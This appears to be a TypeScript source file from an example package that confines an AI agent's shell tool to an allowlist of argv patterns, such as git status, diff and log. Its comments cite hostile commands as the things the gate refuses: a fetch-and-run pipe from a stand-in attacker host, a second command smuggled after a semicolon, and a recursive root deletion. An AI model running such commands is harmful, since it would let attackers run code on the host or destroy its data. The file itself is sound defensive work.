/**
 * `@capnagent-examples/mcp-shell-agent` — capability-bounded shell agent.
 *
 * Closes the high-risk-tool-surface trifecta of @capnagent/mcp's
 * real-world consumers:
 *
 *   - filesystem  → mcp-fs-agent
 *   - network     → mcp-http-agent
 *   - shell exec  → THIS PACKAGE
 *
 * The capability allowlists a specific argv shape (e.g. `git status`,
 * `git diff`, `git log`) and denies everything else — including subtle
 * variants like `git push`, `rm -rf /`, or arbitrary commands the
 * agent might invent. The decisions are made BEFORE the underlying
 * shell client is invoked, so even a fully-compromised agent that
 * tries to spawn `bash -c 'curl evil.com | sh'` is refused at the
 * capability boundary.
 *
 * # Why argv as an array, not a command string?
 *
 * Shell-string-based gates are notoriously easy to smuggle past:
 * `git status; curl evil.com` looks like one git command to a naive
 * `cmd matches "git"` regex but actually runs two. capnagent's gate
 * sees the structured `argv: string[]` directly, so each token is
 * checked against the caveat as the caller intended.
 *
 * The Context provider extracts `arg.cmd` (argv[0]) and `arg.sub`
 * (argv[1] when present) so caveats can use plain `==` comparisons
 * against canonical values:
 *
 *     tool == "shell.exec"
 *       AND arg.cmd == "git"
 *       AND (arg.sub == "status" OR arg.sub == "diff" OR arg.sub == "log")
 */

import { Auditor, type Capability, type Context, Issuer, Verifier, init } from "@capnagent/core";
import { type WrapOptions, wrapMCPClient } from "@capnagent/mcp";

import { type ShellClient, createShellClient } from "./shell-client.js";

export {
  type ShellCallLog,
  type ShellClient,
  type ShellExecArgs,
  type ShellResult,
  createShellClient,
} from "./shell-client.js";

const ROOT_KEY = new Uint8Array(32).fill(0xe1);
const AUDIT_KEY = new Uint8Array(32).fill(0xe2);

/**
 * Issue a capability that allows `shell.exec` for a specific command
 * + subcommand allowlist. The first argv element must equal `cmd`;
 * the second argv element must be one of `subcommands`. Anything
 * else — different cmd, different subcommand, missing subcommand,
 * extra-flags-that-implicitly-rewrite-the-meaning — is rejected by
 * the verifier.
 *
 * Note: this design is deliberately narrow. Real deployments will
 * want to compose multiple capabilities (one per allowed cmd) and
 * issue them to the agent as a vector. capnagent's chain semantics
 * support that natively — `Issuer::issue("foo")` per cap, then
 * attenuate independently if needed.
 */
export function issueShellAllowlistCapability(args: {
  caller: string;
  cmd: string;
  subcommands: ReadonlyArray<string>;
}): Capability {
  const { caller, cmd, subcommands } = args;
  if (subcommands.length === 0) {
    throw new Error("issueShellAllowlistCapability: subcommands must be non-empty");
  }
  if (cmd.length === 0) {
    throw new Error("issueShellAllowlistCapability: cmd must be non-empty");
  }
  for (const sub of subcommands) {
    if (sub.length === 0) {
      throw new Error("issueShellAllowlistCapability: subcommand entries must be non-empty");
    }
  }
  // The DSL string layer doesn't support arbitrary string escaping;
  // reject inputs that contain a `"` so misuse fails at issuance time
  // rather than producing a parser error at verify time.
  if (cmd.includes('"') || subcommands.some((s) => s.includes('"'))) {
    throw new Error(
      'issueShellAllowlistCapability: cmd and subcommands cannot contain `"` (DSL constraint)',
    );
  }

  const subPredicate = subcommands.map((s) => `arg.sub == "${s}"`).join(" OR ");
  const fullPredicate = `tool == "shell.exec" AND arg.cmd == "${cmd}" AND (${subPredicate})`;

  return Issuer.fromKey(ROOT_KEY)
    .issue(`shell.${cmd}.allowlist`)
    .caveat(`caller == "${caller}"`)
    .caveat("now <= @2099-01-01T00:00:00Z")
    .caveat(fullPredicate)
    .build();
}

export interface GuardedShellClient {
  client: ShellClient;
  underlying: ShellClient;
  receipts: ReadonlyArray<unknown>;
}

/**
 * Build a guarded shell client. The wrapper installs a `Context`
 * provider that extracts `arg.cmd` and `arg.sub` from the argv array
 * so caveats can compare against canonical structural fields, not
 * the raw user input.
 *
 * `simulate` is forwarded to the underlying stub client so tests can
 * substitute deterministic results. Production wiring would build a
 * client that actually spawns subprocesses.
 */
export async function createGuardedShellClient(args: {
  capability: Capability;
  caller: string;
  underlying?: ShellClient;
}): Promise<GuardedShellClient> {
  await init();
  const underlying = args.underlying ?? createShellClient();
  const receipts: unknown[] = [];

  const options: WrapOptions = {
    capability: args.capability,
    auditor: new Auditor(AUDIT_KEY),
    verifier: new Verifier(ROOT_KEY),
    context: (toolName: string, callArgs: unknown): Context => {
      const normalized = normalizeArgs(callArgs);
      return {
        caller: args.caller,
        tool: toolName,
        args: normalized,
        nowMs: Date.now(),
      };
    },
    onReceipt: (r) => {
      receipts.push(r);
    },
  };

  const wrapped = wrapMCPClient(underlying, options);
  return { client: wrapped, underlying, receipts };
}

/**
 * Augment the agent's args with the `cmd` and `sub` fields the
 * capability checks. argv[0] is `cmd`; argv[1] is `sub` (or empty
 * string if absent). If argv is missing or malformed, the args are
 * returned unchanged — the caveat check on `arg.cmd == "git"` then
 * fails closed because there's no `arg.cmd`.
 */
function normalizeArgs(callArgs: unknown): unknown {
  if (typeof callArgs !== "object" || callArgs === null) return callArgs;
  const a = callArgs as Record<string, unknown>;
  if (!Array.isArray(a["argv"]) || a["argv"].length === 0) return callArgs;
  const argv = a["argv"] as unknown[];
  if (typeof argv[0] !== "string") return callArgs;
  return {
    ...a,
    cmd: argv[0],
    sub: typeof argv[1] === "string" ? argv[1] : "",
  };
}
